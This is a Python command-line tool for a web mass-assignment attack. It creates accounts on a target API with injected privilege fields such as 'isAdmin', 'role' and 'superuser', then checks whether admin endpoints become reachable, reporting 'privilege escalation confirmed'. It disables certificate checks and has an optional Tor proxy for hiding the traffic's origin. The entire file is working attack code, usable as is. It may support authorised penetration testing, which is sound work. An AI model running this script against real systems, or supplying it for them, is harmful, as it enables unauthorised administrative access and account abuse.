#!/usr/bin/env python3
import requests
import argparse
import json
import urllib3
import random
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MASS_ASSIGNMENT_FIELDS = [
    "role", "isAdmin", "is_admin", "admin", "verified",
    "approved", "active", "superuser", "is_superuser",
    "privilege", "level", "rank", "permissions", "access"
]

ADMIN_VALUES = ["admin", "superuser", "true", "1", True, 1]

def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def send_request(session, url, endpoint, payload, headers, proxies):
    try:
        return session.post(
            f"{url}{endpoint}",
            json=payload,
            headers=headers,
            verify=False,
            proxies=proxies,
            timeout=10
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None


def check_profile(session, url, proxies):
    """
    Attempt to retrieve user profile to verify privilege escalation
    """
    try:
        r = session.get(f"{url}/api/user/profile", verify=False, proxies=proxies, timeout=10)
        return r
    except:
        return None


def check_admin_access(session, url, proxies):
    """
    Attempt to access admin endpoint
    """
    try:
        r = session.get(f"{url}/api/admin", verify=False, proxies=proxies, timeout=10)
        return r.status_code == 200
    except:
        return False


def test_mass_assignment(url, endpoint, base_username, password, fields=None, proxies=None):
    session = requests.Session()
    headers = {"Content-Type": "application/json"}

    fields_to_test = fields if fields else MASS_ASSIGNMENT_FIELDS

    print(f"[*] Testing mass assignment on {url}{endpoint}")
    print(f"[*] Testing {len(fields_to_test)} fields...\n")

    confirmed = []

    # 🔹 Baseline request (no injection)
    baseline_username = base_username + "_" + random_string()
    baseline_payload = {
        "username": baseline_username,
        "password": password
    }

    baseline_resp = send_request(session, url, endpoint, baseline_payload, headers, proxies)
    baseline_text = baseline_resp.text if baseline_resp else ""

    for field in fields_to_test:
        for value in ADMIN_VALUES:

            username = base_username + "_" + random_string()

            payload = {
                "username": username,
                "password": password,
                field: value
            }

            print(f"[*] Testing {field} = {value}")

            r = send_request(session, url, endpoint, payload, headers, proxies)
            if not r:
                continue

            # 🔹 Step 1: Compare response vs baseline
            if r.text != baseline_text:
                print("    [!] Response differs from baseline")

            # 🔹 Step 2: Check profile for stored privilege
            profile = check_profile(session, url, proxies)
            if profile and profile.status_code == 200:
                profile_text = profile.text

                if field in profile_text or str(value) in profile_text:
                    print(f"[+] STORED: {field} appears in profile response")

                    confirmed.append({
                        "field": field,
                        "value": value,
                        "type": "stored",
                        "evidence": profile_text
                    })

            # 🔹 Step 3: Check admin access
            if check_admin_access(session, url, proxies):
                print(f"[!!!] PRIVILEGE ESCALATION CONFIRMED via {field}={value}")

                confirmed.append({
                    "field": field,
                    "value": value,
                    "type": "privilege_escalation",
                    "evidence": "Admin endpoint accessible"
                })

                return confirmed  # stop early on high impact

            print("    [-] No confirmed impact\n")

    return confirmed


def save_results(results, outfile):
    with open(outfile, "w") as f:
        for item in results:
            f.write(json.dumps(item, indent=2) + "\n\n")

    print(f"[+] Results saved to {outfile}")


def main():
    parser = argparse.ArgumentParser(description="Advanced Mass Assignment Detection Module")
    parser.add_argument("url")
    parser.add_argument("endpoint")
    parser.add_argument("username")
    parser.add_argument("password")
    parser.add_argument("--fields", nargs="+")
    parser.add_argument("--tor", action="store_true")
    parser.add_argument("--outfile")

    args = parser.parse_args()

    proxies = None
    if args.tor:
        print("[*] Routing through Tor...")
        proxies = {
            "http": "socks5h://127.0.0.1:9050",
            "https": "socks5h://127.0.0.1:9050"
        }

    results = test_mass_assignment(
        args.url,
        args.endpoint,
        args.username,
        args.password,
        args.fields,
        proxies
    )

    if results:
        print("\n[+] Findings:")
        for r in results:
            print(f"    {r['type'].upper()} via {r['field']}={r['value']}")

        if args.outfile:
            save_results(results, args.outfile)
    else:
        print("[-] No exploitable mass assignment found")


if __name__ == "__main__":
    main()
